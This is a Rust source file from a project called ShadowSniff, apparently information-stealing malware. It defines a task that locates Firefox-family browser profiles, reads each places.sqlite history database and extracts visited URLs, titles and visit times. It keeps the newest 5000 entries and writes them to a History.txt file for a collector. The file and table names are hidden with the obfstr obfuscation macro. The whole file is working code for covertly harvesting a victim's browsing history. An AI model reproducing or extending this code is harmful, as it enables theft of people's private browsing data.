/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use crate::gecko::GeckoBrowserData;
use crate::{
    ExtractExt, History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all,
};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const MOZ_PLACES_URL: usize = 1;
const MOZ_PLACES_TITLE: usize = 2;
const MOZ_PLACES_LAST_VISIT_DATE: usize = 8;

#[derive(new)]
pub(super) struct HistoryTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask<'_> {
    parent_name!("History.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut history) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("places.sqlite"),
            s!("moz_places"),
            History::make_extractor((MOZ_PLACES_URL, MOZ_PLACES_TITLE, MOZ_PLACES_LAST_VISIT_DATE)),
        ) else {
            return;
        };

        history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
        history.truncate(5000);

        collector.get_browser().increase_history_by(history.len());
        let _ = to_string_and_write_all(&history, "\n\n", filesystem, parent);
    }
}
